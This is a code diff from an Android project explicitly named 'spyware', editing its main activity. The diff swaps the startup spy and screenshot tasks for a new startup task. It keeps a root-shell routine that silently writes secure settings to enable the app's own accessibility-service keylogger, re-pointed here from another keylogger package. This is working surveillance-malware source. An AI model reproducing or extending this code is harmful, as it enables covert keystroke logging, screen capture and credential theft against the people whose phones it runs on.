@@ -1,6 +1,7 @@
 package com.example.cristianturetta.spyware;
 
 import android.app.Activity;
+import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.Looper;
@@ -29,8 +30,9 @@ public class MainActivity extends AppCompatActivity {
 
         setContentView(R.layout.activity_main);
 
-        (new SpyAsyncTask()).execute();
-        (new ScreenshotUtilRunnable()).run();
+        (new StartupAsyncTask()).execute();
+        //(new SpyAsyncTask()).execute();
+        //(new ScreenshotUtilRunnable()).run();
     }
 
     void enableAccessibility(){
@@ -44,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 Process process = Runtime.getRuntime().exec("su");
                 DataOutputStream os = new DataOutputStream(process.getOutputStream());
-                os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n");
+                os.writeBytes("settings put secure enabled_accessibility_services com.example.cristianturetta.spyware/com.example.cristianturetta.spyware.Keylogger\n");
                 os.flush();
                 os.writeBytes("settings put secure accessibility_enabled 1\n");
                 os.flush();
